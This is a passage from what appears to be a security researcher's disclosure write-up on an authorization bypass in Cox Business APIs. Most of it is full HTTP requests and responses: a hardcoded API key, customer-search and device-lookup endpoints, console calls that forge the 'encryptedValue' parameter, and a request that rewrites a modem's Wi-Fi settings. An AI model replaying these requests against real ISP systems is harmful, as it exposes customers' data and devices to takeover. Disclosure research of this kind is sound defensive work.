<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls:</p>
<pre><code>account (115 routes)
voiceutilities (73 routes)
user (70 routes)
datainternetgateway (57 routes)
accountequipment (55 routes)
billing (53 routes)
ticket (52 routes)
profile (47 routes)
voicecallmanagement (46 routes)
voicemail (37 routes)
voiceusermanagement (30 routes)
userauthorization (24 routes)
csr (16 routes)
voiceprofile (14 routes)
</code></pre>
<p>After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts:</p>
<pre><code>accountequipment (55 routes)
datainternetgateway (57 routes)
account (115 routes)
</code></pre>
<p>Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response.</p>

<p>After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following &#34;profilesearch&#34; endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search:</p>
<pre><code><span>GET</span> <span>/api/cbma/profile/services/profile/profilesearch/</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>&#34;message&#34;:</span> <span>&#34;Success&#34;</span>,
  <span>&#34;profile&#34;:</span> {
    <span>&#34;numberofRecords&#34;:</span> <span>&#34;0 hits&#34;</span>,
    <span>&#34;searchList&#34;:</span> []
  }
}
</code></pre>
<p>From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in <code>test</code> into the URI and got the following response:</p>
<pre><code><span>{</span>
  <span>&#34;message&#34;</span><span>:</span> <span>&#34;Authorization Error-Invalid User Token&#34;</span>
<span>}</span>
</code></pre>
<p>Invalid user token? But I’d just been able to hit this endpoint? I removed the word <code>test</code> from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder.</p>
<p>I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful.</p>
<p>To test if I could reproduce this with an actual search query, I wrote down <code>cox</code> in the URI and replayed the request 2-3 more times until I saw the following response:</p>
<pre><code><span>{</span>
  <span>&#34;message&#34;</span><span>:</span> <span>&#34;Success&#34;</span><span>,</span>
  <span>&#34;profile&#34;</span><span>:</span> <span>{</span>
    <span>&#34;numberofRecords&#34;</span><span>:</span> <span>&#34;10000+ hits&#34;</span><span>,</span>
    <span>&#34;searchList&#34;</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>&#34;value&#34;</span><span>:</span> <span>&#34;COX REDACTED&#34;</span><span>,</span>
        <span>&#34;profileGuid&#34;</span><span>:</span> <span>&#34;cbbccdae-b1ab-4e8c-9cec-e20c425205a1&#34;</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>&#34;value&#34;</span><span>:</span> <span>&#34;Cox Communications SIP Trunk REDACTED&#34;</span><span>,</span>
        <span>&#34;profileGuid&#34;</span><span>:</span> <span>&#34;bc2a49c7-0c3f-4cab-9133-de7993cb1c7d&#34;</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>&#34;value&#34;</span><span>:</span> <span>&#34;cox test account ds1/REDACTED&#34;</span><span>,</span>
        <span>&#34;profileGuid&#34;</span><span>:</span> <span>&#34;74551032-e703-46a2-a252-dc75d6daeedc&#34;</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word &#34;cox&#34; with &#34;fbi&#34; to see if it was actually pulling customer data:</p>
<pre><code><span>{</span>
  <span>&#34;message&#34;</span><span>:</span> <span>&#34;Success&#34;</span><span>,</span>
  <span>&#34;profile&#34;</span><span>:</span> <span>{</span>
    <span>&#34;numberofRecords&#34;</span><span>:</span> <span>&#34;REDACTED hits&#34;</span><span>,</span>
    <span>&#34;searchList&#34;</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>&#34;value&#34;</span><span>:</span> <span>&#34;FBI REDACTED&#34;</span><span>,</span>
        <span>&#34;profileGuid&#34;</span><span>:</span> <span>&#34;7b9f092a-e938-41d5-bcf5-0be1bb6487f5&#34;</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>&#34;value&#34;</span><span>:</span> <span>&#34;FBI REDACTED&#34;</span><span>,</span>
        <span>&#34;profileGuid&#34;</span><span>:</span> <span>&#34;c8923f6f-b4ed-4f66-a743-000a961edb35&#34;</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>&#34;value&#34;</span><span>:</span> <span>&#34;FBI REDACTED&#34;</span><span>,</span>
        <span>&#34;profileGuid&#34;</span><span>:</span> <span>&#34;a32b8112-48ac-4a4f-8893-5ca1c392a31d&#34;</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good!</p>
<p>We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was.</p>
<h3 id="confirming-we-can-access-anyones-equipment">Confirming We Can Access Anyone&#39;s Equipment</h3>
<p>I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could&#39;ve been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both.</p>
<p>I went ahead and pulled out the simplest looking request that took in a <code>macAddress</code> parameter to test if I could access my own modem via the API.</p>
<pre><code>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac
</code></pre>
<p>This was a GET request to retrieve a modem IP address that required a <code>macAddress</code> parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>&#34;message&#34;:</span> <span>&#34;Success&#34;</span>,
  <span>&#34;ipv4&#34;:</span> <span>&#34;98.165.155.8&#34;</span>
}
</code></pre>
<p>It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone&#39;s device.</p>
<p>The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone&#39;s account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the <code>accountequipment/services/accountequipment/v1/equipments</code> endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>&#34;accountEquipmentList&#34;:</span> [
    {
      <span>&#34;equipmentCategory&#34;:</span> <span>&#34;Internet&#34;</span>,
      <span>&#34;equipmentModelMake&#34;:</span> <span>&#34;NOKIA G-010G-A&#34;</span>,
      <span>&#34;equipmentName&#34;:</span> <span>&#34;NOKIA G-010G-A&#34;</span>,
      <span>&#34;equipmentType&#34;:</span> <span>&#34;Nokia ONT&#34;</span>,
      <span>&#34;itemModelMake&#34;:</span> <span>&#34;NOKIA&#34;</span>,
      <span>&#34;itemModelNumber&#34;:</span> <span>&#34;G-010G-A&#34;</span>,
      <span>&#34;itemNumber&#34;:</span> <span>&#34;DAL10GB&#34;</span>,
      <span>&#34;macAddress&#34;:</span> <span>&#34;f8:0c:58:bb:cb:92&#34;</span>,
      <span>&#34;portList&#34;:</span> [
        {
          <span>&#34;address&#34;:</span> <span>&#34;F80C58BBCB92&#34;</span>,
          <span>&#34;portNumber&#34;:</span> <span>&#34;1&#34;</span>,
          <span>&#34;portType&#34;:</span> <span>&#34;ONT_ALU&#34;</span>,
          <span>&#34;qualityAssuranceDate&#34;:</span> <span>&#34;20220121&#34;</span>,
          <span>&#34;serviceCategoryDescription&#34;:</span> <span>&#34;Data&#34;</span>
        }
      ],
      <span>&#34;serialNumber&#34;:</span> <span>&#34;ALCLEB313C84&#34;</span>
    },
    {
      <span>&#34;equipmentCategory&#34;:</span> <span>&#34;Voice&#34;</span>,
      <span>&#34;equipmentModelMake&#34;:</span> <span>&#34;CISCO DPQ3212&#34;</span>,
      <span>&#34;equipmentName&#34;:</span> <span>&#34;CISCO DPQ3212&#34;</span>,
      <span>&#34;equipmentType&#34;:</span> <span>&#34;Cable Modem&#34;</span>,
      <span>&#34;itemModelMake&#34;:</span> <span>&#34;CISCO&#34;</span>,
      <span>&#34;itemModelNumber&#34;:</span> <span>&#34;DPQ3212&#34;</span>,
      <span>&#34;itemNumber&#34;:</span> <span>&#34;DSA321N&#34;</span>,
      <span>&#34;macAddress&#34;:</span> <span>&#34;e4:48:c7:0d:9a:71&#34;</span>,
      <span>&#34;portList&#34;:</span> [
        {
          <span>&#34;address&#34;:</span> <span>&#34;E448C70D9A71&#34;</span>,
          <span>&#34;portNumber&#34;:</span> <span>&#34;1&#34;</span>,
          <span>&#34;portType&#34;:</span> <span>&#34;DATA_D3&#34;</span>,
          <span>&#34;qualityAssuranceDate&#34;:</span> <span>&#34;20111229&#34;</span>,
          <span>&#34;serviceCategoryDescription&#34;:</span> <span>&#34;Unknown&#34;</span>
        },
        {
          <span>&#34;address&#34;:</span> <span>&#34;E448C70D9A75&#34;</span>,
          <span>&#34;portNumber&#34;:</span> <span>&#34;2&#34;</span>,
          <span>&#34;portType&#34;:</span> <span>&#34;TELEPHONY&#34;</span>,
          <span>&#34;qualityAssuranceDate&#34;:</span> <span>&#34;20111229&#34;</span>,
          <span>&#34;serviceCategoryCode&#34;:</span> <span>&#34;T&#34;</span>,
          <span>&#34;serviceCategoryDescription&#34;:</span> <span>&#34;Telephone&#34;</span>
        }
      ],
      <span>&#34;serialNumber&#34;:</span> <span>&#34;240880144&#34;</span>
    },
    {
      <span>&#34;equipmentCategory&#34;:</span> <span>&#34;Television&#34;</span>,
      <span>&#34;equipmentModelMake&#34;:</span> <span>&#34;Cox Business TV (Contour 1)&#34;</span>,
      <span>&#34;equipmentName&#34;:</span> <span>&#34;Cox Business TV (Contour 1)&#34;</span>,
      <span>&#34;equipmentType&#34;:</span> <span>&#34;Cable Receiver&#34;</span>,
      <span>&#34;itemModelMake&#34;:</span> <span>&#34;CISCO&#34;</span>,
      <span>&#34;itemModelNumber&#34;:</span> <span>&#34;650&#34;</span>,
      <span>&#34;itemNumber&#34;:</span> <span>&#34;GSX9865&#34;</span>,
      <span>&#34;macAddress&#34;:</span> <span>&#34;50:39:55:da:93:05&#34;</span>,
      <span>&#34;portList&#34;:</span> [
        {
          <span>&#34;address&#34;:</span> <span>&#34;44E08EBB6DBC&#34;</span>,
          <span>&#34;portNumber&#34;:</span> <span>&#34;1&#34;</span>,
          <span>&#34;portType&#34;:</span> <span>&#34;CHDDVRX1&#34;</span>,
          <span>&#34;qualityAssuranceDate&#34;:</span> <span>&#34;20131108&#34;</span>,
          <span>&#34;serviceCategoryDescription&#34;:</span> <span>&#34;Cable&#34;</span>
        }
      ],
      <span>&#34;serialNumber&#34;:</span> <span>&#34;SACDRVKQN&#34;</span>
    }
  ]
}
</code></pre>
<p>It worked! My connected equipment was returned in the HTTP response.</p>
<h3 id="accessing-and-updating-any-cox-business-customer-account">Accessing and Updating any Cox Business Customer Account</h3>
<p>To test if this could be abused to access and modify business customer accounts, I found an API request which could query customers via email. I sent the following HTTP request and saw the following response:</p>
<pre><code><span>GET</span> <span>/api/cbma/user/services/user/admin@cox.net</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>&#34;id&#34;:</span> <span>&#34;admin@cox.net&#34;</span>,
  <span>&#34;guid&#34;:</span> <span>&#34;89d6db21-402d-4a57-a87b-cad85d01b192&#34;</span>,
  <span>&#34;email&#34;:</span> <span>&#34;admin@cox.net&#34;</span>,
  <span>&#34;firstName&#34;:</span> <span>&#34;Redacted&#34;</span>,
  <span>&#34;lastName&#34;:</span> <span>&#34;Redacted&#34;</span>,
  <span>&#34;primaryPhone&#34;:</span> <span>&#34;Redacted&#34;</span>,
  <span>&#34;status&#34;:</span> <span>&#34;INACTIVE&#34;</span>,
  <span>&#34;type&#34;:</span> <span>&#34;RETAIL&#34;</span>,
  <span>&#34;profileAdmin&#34;:</span> <span>true</span>,
  <span>&#34;profileOwner&#34;:</span> <span>true</span>,
  <span>&#34;isCpniSetupRequired&#34;:</span> <span>false</span>,
  <span>&#34;isPasswordChangeRequired&#34;:</span> <span>true</span>,
  <span>&#34;timeZone&#34;:</span> <span>&#34;EST&#34;</span>,
  <span>&#34;userType&#34;:</span> <span>&#34;PROFILE_OWNER&#34;</span>,
  <span>&#34;userProfileDetails&#34;:</span> {
    <span>&#34;id&#34;:</span> <span>&#34;{3DES}JA1+doxmDYc=&#34;</span>,
    <span>&#34;guid&#34;:</span> <span>&#34;9795bd4c-92d6-4aa2-ad30-1da4bbcbe1da&#34;</span>,
    <span>&#34;name&#34;:</span> <span>&#34;Supreme Carpet Care&#34;</span>,
    <span>&#34;status&#34;:</span> <span>&#34;ACTIVE&#34;</span>,
    <span>&#34;ownerEmail&#34;:</span> <span>&#34;admin@cox.net&#34;</span>
  },
  <span>&#34;contactType&#34;:</span> {
    <span>&#34;contactInfo&#34;:</span> [
      {
        <span>&#34;type&#34;:</span> <span>&#34;alternateEmail&#34;</span>,
        <span>&#34;value&#34;:</span> <span>&#34;redacted@redacted.com&#34;</span>
      }
    ]
  },
  <span>&#34;preferredEmail&#34;:</span> <span>&#34;admin@cox.net&#34;</span>
}
</code></pre>
<p>Another similar POST account update request worked. This confirmed we could read and write to business accounts.</p>
<p>At this point, I&#39;d demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution.</p>
<h3 id="overwriting-anyones-device-settings-via-leaked-cryptographic-secret">Overwriting Anyone&#39;s Device Settings via Leaked Cryptographic Secret</h3>
<p>Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called <code>encryptedValue</code>. If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution.</p>
<p>To know if I could even generate this <code>encryptedValue</code> parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed.</p>
<figure><img alt="JS" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75"/><figcaption>JS</figcaption></figure>
<p>After tracing the <code>encryptedValue</code> parameter back through the JavaScript, I landed on these two functions:</p>
<pre><code><span>encryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> k = n.<span>AES</span>.<span>encrypt</span>(D, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>ciphertext</span>.<span>toString</span>(n.<span>enc</span>.<span>Base64</span>);
    <span>return</span> <span>btoa</span>(s.<span>IV</span> + <span>&#34;::&#34;</span> + s.<span>qs</span> + <span>&#34;::&#34;</span> + k)
}
</code></pre>
<pre><code><span>decryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> W = <span>atob</span>(D),
        k = <span>this</span>.<span>sanitize</span>(W.<span>split</span>(<span>&#34;::&#34;</span>)[<span>2</span>]),
        M = n.<span>lib</span>.<span>CipherParams</span>.<span>create</span>({
            <span>ciphertext</span>: n.<span>enc</span>.<span>Base64</span>.<span>parse</span>(k)
        });
    <span>return</span> n.<span>AES</span>.<span>decrypt</span>(M, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>toString</span>(n.<span>enc</span>.<span>Utf8</span>)
}
</code></pre>
<p>Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function!</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>I set a breakpoint at exactly where the <code>encryptWithSaltAndPadding</code> function was called, then hit enter.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function.</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>&#34;OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0=&#34;</span>)
<span>&#34;8042&#34;</span>
</code></pre>
<p>Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an <code>encryptedValue</code> parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again:</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>&#34;OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09&#34;</span>)
<span>541051614702</span>;<span>DTC4131</span>;<span>333415591</span>;<span>1</span>;<span>f4</span>:<span>c1</span>:<span>14</span>:<span>70</span>:4<span>d</span>:ac;<span>Internet</span>
</code></pre>
<p>Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters.</p>
<pre><code><span>541051614702</span> <span>=</span> <span>Cox</span> <span>Account</span> <span>Number</span>
<span>DTC4131</span> <span>=</span> <span>Device</span> <span>Name</span>
<span>333415592</span> <span>=</span> <span>Device</span> <span>ID</span>
<span>1</span> <span>=</span> <span>Unknown</span>
<span>f4:c1:14:70:4d:ac</span> <span>=</span> <span>MAC</span> <span>address</span>
<span>Internet</span> <span>=</span> <span>Label</span>
</code></pre>
<p>If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further.</p>
<h2 id="executing-commands-on-any-modem">Executing Commands on Any Modem</h2>
<p>On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. <code>123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING</code>) to see if it actually validated that the account ID matched the MAC address:</p>
<pre><code>t.<span>cbHelper</span>.<span>encryptWithSaltandPadding</span>(<span>&#34;123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING&#34;</span>)
<span>OGEzMjNmNjFhOTk</span>2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpLUlArd3Jqek5Ra3VlZUVReXVUWEZHbE91NWVQRzk0WEo1Zi9wSDdVZWxHVkFXYmtWd2Z2YmNHU1FWOVRFT2prZm5tNFhWZlQwNkQ3V2tDU1FqbHpIUT09
</code></pre>
<p>The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID.</p>
<p>I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain.</p>
<p>I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware:</p>
<pre><code><span>POST</span> <span>/api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:123.0)</span> <span>Gecko/20100101</span> <span>Firefox/123.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>56583255</span><span>-1cf3-41aa-9600-3d5585152e87</span>
<span>Connection:</span> <span>close</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>431</span>

{
  <span>&#34;wifiSettings&#34;:</span> {
    <span>&#34;customerWifiSsid24&#34;:</span> <span>&#34;Curry&#34;</span>
  },
  <span>&#34;additionalProperties&#34;:</span> {
    <span>&#34;customerWifiSsid24&#34;:</span> [
      <span>&#34;Curry&#34;</span>
    ]
  },
  <span>&#34;encryptedValue&#34;:</span> <span>&#34;T0dFek1qTm1OakZoT1RrMk1HSTJPVE0wTnpBek5Ua3pPRFprT0dZeE9ESTZPamhoTnpVMU5UTmxNREF6T1RsaE5XUTVaams1WlRZek16TTNNMlJpWVdVek9qcENVMlp1TjJ0blVsTkNlR1ZhZDJsd05qZGhjWFo0TTJsaVJHSkhlU3N2TUhWVWFYZzJWVTByYzNsT2RYWklMek16VjJ4VldFYzJTMWx5VEVNMVRuSkxOVVF3VFhFek9UVmlUR2RGVFd4RUt6aGFUMnhoZHowOQ==&#34;</span>
}
</code></pre>
<pre><code>HTTP/<span>1.1</span> <span>200</span> OK
Server<span>:</span> nginx

<span>{</span>
  <span>&#34;message&#34;</span><span>:</span> <span>&#34;Success&#34;</span>
<span>}</span>
</code></pre>
<p>Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must&#39;ve reset my device.</p>
<p>About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone&#39;s device using this exploit.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could&#39;ve accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could&#39;ve used this access to exploit any of the millions of Cox devices that were accessible through these APIs.</p>
